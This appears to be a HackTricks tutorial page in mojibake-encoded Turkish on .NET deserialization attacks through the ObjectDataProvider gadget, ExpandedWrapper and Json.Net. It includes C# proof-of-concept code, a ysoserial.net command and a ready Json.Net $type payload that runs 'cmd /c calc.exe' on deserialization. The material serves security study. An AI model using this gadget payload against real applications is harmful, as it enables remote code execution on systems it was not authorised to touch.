# Temel .Net serileÅŸtirme (ObjectDataProvider aracÄ±, ExpandedWrapper ve Json.Net)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* **Bir siber gÃ¼venlik ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz? ya da PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* **ğŸ’¬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek PR'ler gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaÅŸÄ±n.**

</details>

Bu yazÄ±, **ObjectDataProvider aracÄ±nÄ±n nasÄ±l sÃ¶mÃ¼rÃ¼ldÃ¼ÄŸÃ¼nÃ¼ anlamak** ve RCE elde etmek iÃ§in **SerileÅŸtirme kÃ¼tÃ¼phaneleri Json.Net ve xmlSerializer'Ä±n** bu araÃ§la nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine adanmÄ±ÅŸtÄ±r.

## ObjectDataProvider AracÄ±

Belgelerden: _ObjectDataProvider SÄ±nÄ±fÄ±, bir baÄŸlama kaynaÄŸÄ± olarak kullanabileceÄŸiniz bir nesneyi sarmalar ve oluÅŸturur_.\
Evet, garip bir aÃ§Ä±klama, o yÃ¼zden bu sÄ±nÄ±fÄ±n neden bu kadar ilginÃ§ olduÄŸuna bakalÄ±m: Bu sÄ±nÄ±f, **keyfi bir nesneyi sarmaya** izin verir, _**MethodParameters**_ kullanarak **keyfi parametreler belirlemeyi** ve ardÄ±ndan **keyfi bir nesnenin keyfi parametreler kullanÄ±larak belirtilen keyfi bir iÅŸlevi Ã§aÄŸÄ±rmayÄ±** saÄŸlar.\
Bu nedenle, keyfi **nesne**, **serileÅŸtirilirken** **parametrelerle bir iÅŸlevi yÃ¼rÃ¼tecektir.**

### **Bu nasÄ±l mÃ¼mkÃ¼n**

ObjectDataProvider'Ä±n tanÄ±mlandÄ±ÄŸÄ± ve uygulandÄ±ÄŸÄ± **System.Windows.Data** ad alanÄ±, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF` konumundaki **PresentationFramework.dll** iÃ§inde bulunur.

[**dnSpy**](https://github.com/0xd4d/dnSpy) kullanarak ilgilendiÄŸimiz sÄ±nÄ±fÄ±n kodunu **inceleyebilirsiniz**. AÅŸaÄŸÄ±daki resimde **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method adÄ±** kodunu gÃ¶rÃ¼yoruz.

![](<../../.gitbook/assets/image (424).png>)

`MethodName` ayarlandÄ±ÄŸÄ±nda `base.Refresh()` Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶zlemleyebilirsiniz, hadi bu iÅŸlevin ne yaptÄ±ÄŸÄ±na bakalÄ±m:

![](<../../.gitbook/assets/image (316).png>)

Tamam, `this.BeginQuery()`'yi gÃ¶rmeye devam edelim. `BeginQuery`, `ObjectDataProvider` tarafÄ±ndan geÃ§ersiz kÄ±lÄ±nmÄ±ÅŸtÄ±r ve ÅŸunu yapar:

![](<../../.gitbook/assets/image (342).png>)

Kodun sonunda `this.QueryWorke(null)` Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± unutmayÄ±n. Bu iÅŸlevin ne yaptÄ±ÄŸÄ±nÄ± gÃ¶relim:

![](<../../.gitbook/assets/image (593).png>)

Bu, `QueryWorker` iÅŸlevinin tam kodu deÄŸil, ancak ilginÃ§ kÄ±smÄ±nÄ± gÃ¶steriyor: Kod, **`this.InvokeMethodOnInstance(out ex);`** bu satÄ±rda **belirtilen yÃ¶ntemi Ã§aÄŸÄ±rÄ±r**,.

EÄŸer sadece _**MethodName**_ ayarlayarak bunun yÃ¼rÃ¼tÃ¼leceÄŸini kontrol etmek isterseniz, bu kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
Not edin, `System.Windows.Data`'yÄ± yÃ¼klemek iÃ§in _C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ dosyasÄ±nÄ± referans olarak eklemeniz gerekmektedir.

## ExpandedWrapper

Ã–nceki aÃ§Ä±ktan yararlanarak, **nesne**nin bir _**ObjectDataProvider**_ Ã¶rneÄŸi olarak **deserialize edileceÄŸi durumlar olacaktÄ±r** (Ã¶rneÄŸin DotNetDuke aÃ§Ä±ÄŸÄ±, XmlSerializer kullanÄ±larak nesne `GetType` kullanÄ±larak deserialize edildi). ArdÄ±ndan, _ObjectDataProvider_ Ã¶rneÄŸine sarÄ±lan nesne tÃ¼rÃ¼ hakkÄ±nda **bilgi sahibi olmayacaksÄ±nÄ±z** (`Process` Ã¶rneÄŸin). DotNetDuke aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla [bilgiye buradan ulaÅŸabilirsiniz](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1).

Bu sÄ±nÄ±f, verilen bir Ã¶rnekte **kapsanan nesnelerin nesne tÃ¼rlerini belirtmeye** olanak tanÄ±r. Bu nedenle, bu sÄ±nÄ±f, bir kaynak nesneyi (_ObjectDataProvider_) yeni bir nesne tÃ¼rÃ¼ne kapsayabilir ve ihtiyacÄ±mÄ±z olan Ã¶zellikleri saÄŸlayabilir (_ObjectDataProvider.MethodName_ ve _ObjectDataProvider.MethodParameters_).\
Bu, Ã¶nceki sunulan durumlar gibi durumlar iÃ§in Ã§ok yararlÄ±dÄ±r, Ã§Ã¼nkÃ¼ **_ObjectDataProvider_**'Ä± bir **_ExpandedWrapper_** Ã¶rneÄŸinin iÃ§ine **sarabiliriz** ve bu sÄ±nÄ±f **deserialize edildiÄŸinde** _**MethodName**_ iÃ§inde belirtilen **iÅŸlevi yÃ¼rÃ¼tecek** olan _**ObjectDataProvider**_ nesnesini **oluÅŸturacaktÄ±r**.

Bu sarmalayÄ±cÄ±yÄ± aÅŸaÄŸÄ±daki kodla kontrol edebilirsiniz:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[Resmi web sayfasÄ±nda](https://www.newtonsoft.com/json) bu kÃ¼tÃ¼phanenin **Json.NET'in gÃ¼Ã§lÃ¼ JSON serileÅŸtiricisi ile herhangi bir .NET nesnesini serileÅŸtirmeye ve serileÅŸtirmeye izin verdiÄŸi** belirtilmektedir. DolayÄ±sÄ±yla, eÄŸer **ObjectDataProvider gadget'Ä±nÄ± deserialize edebilirsek**, sadece bir nesneyi deserialize ederek bir **Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebiliriz.

### Json.Net Ã¶rneÄŸi

Ã–ncelikle, bu kÃ¼tÃ¼phaneyi kullanarak bir nesneyi **serileÅŸtirmek/deserileÅŸtirmek** iÃ§in bir Ã¶rnek gÃ¶relim:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net'i KÃ¶tÃ¼ye Kullanma

[ysoserial.net](https://github.com/pwntester/ysoserial.net) kullanarak saldÄ±rÄ±yÄ± oluÅŸturdum:
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
Bu kodda **saldÄ±rÄ±yÄ± test edebilirsiniz**, sadece Ã§alÄ±ÅŸtÄ±rÄ±n ve bir hesap makinesinin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶receksiniz:
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz**? ya da **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* **KatÄ±lÄ±n** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) ya da [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
